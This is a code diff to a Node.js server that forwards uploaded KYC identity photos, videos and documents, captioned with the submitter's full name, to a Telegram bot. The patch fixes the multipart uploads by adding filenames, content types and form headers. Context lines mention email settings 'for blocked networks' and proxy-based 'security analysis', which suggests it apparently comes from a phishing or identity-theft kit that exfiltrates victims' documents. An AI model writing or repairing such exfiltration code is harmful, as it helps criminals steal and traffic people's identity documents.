@@ -1,6 +1,7 @@
 import nodemailer from 'nodemailer';
 import fs from 'fs';
 import path from 'path';
+import FormData from 'form-data';
 
 // Email configuration - Try different approach for blocked networks
 const createEmailTransporter = () => {
@@ -240,12 +241,16 @@ ${securityAnalysis.proxyInfo ? `
             // Send as photo
             const formData = new FormData();
             formData.append('chat_id', chatId);
-            formData.append('photo', fs.createReadStream(file.path));
+            formData.append('photo', fs.createReadStream(file.path), {
+              filename: file.originalname,
+              contentType: 'image/jpeg'
+            });
             formData.append('caption', `📷 ${file.originalname} - ${kycData.fullName}`);
 
             const photoResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
               method: 'POST',
-              body: formData
+              body: formData,
+              headers: formData.getHeaders()
             });
 
             if (!photoResponse.ok) {
@@ -255,12 +260,16 @@ ${securityAnalysis.proxyInfo ? `
             // Send as video
             const formData = new FormData();
             formData.append('chat_id', chatId);
-            formData.append('video', fs.createReadStream(file.path));
+            formData.append('video', fs.createReadStream(file.path), {
+              filename: file.originalname,
+              contentType: 'video/mp4'
+            });
             formData.append('caption', `🎥 ${file.originalname} - ${kycData.fullName}`);
 
             const videoResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
               method: 'POST',
-              body: formData
+              body: formData,
+              headers: formData.getHeaders()
             });
 
             if (!videoResponse.ok) {
@@ -270,12 +279,15 @@ ${securityAnalysis.proxyInfo ? `
             // Send as document
             const formData = new FormData();
             formData.append('chat_id', chatId);
-            formData.append('document', fs.createReadStream(file.path));
+            formData.append('document', fs.createReadStream(file.path), {
+              filename: file.originalname
+            });
             formData.append('caption', `📄 ${file.originalname} - ${kycData.fullName}`);
 
             const docResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
               method: 'POST',
-              body: formData
+              body: formData,
+              headers: formData.getHeaders()
             });
 
             if (!docResponse.ok) {
